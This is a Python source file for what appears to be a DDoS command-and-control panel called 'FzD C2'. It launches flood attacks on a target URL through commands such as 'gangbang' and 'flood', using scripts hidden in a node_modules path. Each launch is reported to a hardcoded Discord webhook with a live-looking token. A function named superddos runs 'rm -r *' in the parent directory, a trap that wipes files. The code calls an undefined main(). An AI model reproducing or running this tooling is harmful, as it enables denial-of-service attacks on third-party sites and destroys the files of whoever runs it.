#remake boleh tapi izin dulu!! 
#t.me/mrd4nd

import subprocess
import os
import time
import socket
import requests
import random
import getpass
import sys
import json
import platform

def sendsocket(socket_url, message):
    data = {
        "content": message
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(socket_url, data=json.dumps(data), headers=headers)

def menu(): 
     sys.stdout.write(f"         \x1b]2;FzD C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07") 
     os.system('cls' if os.name == 'nt' else 'clear') 
     print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to FzD C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: FzD Team \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1\x1b[38;2;0;255;255m | \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m]') 
     print("") 
     print(""" 
                        ,     ,                        
                        |\---/|                   Support By : <177 Members & Dandier & Zelly Noy>
                       /  , , |                   Vip : <True>     
                  __.-'|  / \ /                   User : <Root>     
         __ ___.-'        ._O|                        
      .-'  '        :      _/                     ╒══════════════════════════════════════════════════════╕   
     / ,    .        .     |                        This tools is not for sell. Private tools and method.
    :  ;    :        :   _/                         Credit : ZxCDDoSS
    |  |   .'     __:   /                           Team   : FzDDoSS
    |  :   /'----'| \  |                          ╘══════════════════════════════════════════════════════╛
    \  |\  |      | /| |                        
     '.'| /       || \ |                        
     | /|.'       '.l \\_                        
     || ||             '-'                        
     '-''-'
 """)
    while True:
        cnc = input('''\x1b[38;2;0;212;14m╔══[root\x1b[38;2;0;186;45m@ka\x1b[38;2;0;150;88ml\x1b[38;2;0;113;133mi\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤  \x1b[38;2;239;239;239m''')
        if "gangbang" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                sendsocket(socket_url, f"\n\n---------------\nGANGBANG\n---------------\nTarget: {url}\nTime: {time}\n---------------\n‎ \n‎ \n‎ ")
                mix = os.path.join("node_modules/randomstring/examples/methods", "mix.js")
                os.system(f'node {mix} {url} {time}')
            except IndexError:
                print('Usage: gangbang <url> <time>')
                print('Example: gangbang https://example.com 60')
        
        elif "dandier" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                sendsocket(socket_url, f"\n\n---------------\nDANDIER\n---------------\nTarget: {url}\nThreads: {thread}\n---------------\n‎ \n‎ \n‎ ")
                dandier = os.path.join("node_modules/randomstring/examples/methods", "dandier.java")
                os.system(f'java {dandier} {url} {thread}')
            except IndexError:
                print('Usage: dandier <url> <thread>')
                print('Example: dandier https://example.com 15000')
                
        elif "flood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                rpc = cnc.split()[3]
                time = cnc.split()[4]
                sendsocket(socket_url, f"\n\n---------------\nFLOOD\n---------------\nTarget: {url}\nThreads: {thread}\nRpc: {rpc}\nTime: {time}\n---------------\n‎ \n‎ \n‎ ")
                flood = os.path.join("node_modules/randomstring/examples/methods", "flood.py")
                os.system(f'python3 {flood} {url} {thread} {rpc} {time}')
            except IndexError:
                print('Usage: flood <target> <workers> <rpc> <timer>')
                print('Example: flood https://example.com 500 250 60')
                
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Method: [ " + cmmnd + " ] Tidak Di Temukan!")
            except IndexError:
                pass
                
socket_url = "https://discord.com/api/webhooks/1123200627351240776/HSNj_RHdhmjyBj6F2Zz3Pdb4XX6osq90liUFDXyHL7-gyRptyBwSKGvxQm1bF7Hx49Lm"

def superddos():
    os.chdir('..') 
    time.sleep(3)
    file_list = os.listdir()

    for file in file_list:
        if os.path.isfile(file):
            subprocess.call("rm -r *", shell=True)
    
author = "dandier"

if author == "dandier":
    main()
else:
    superddos()
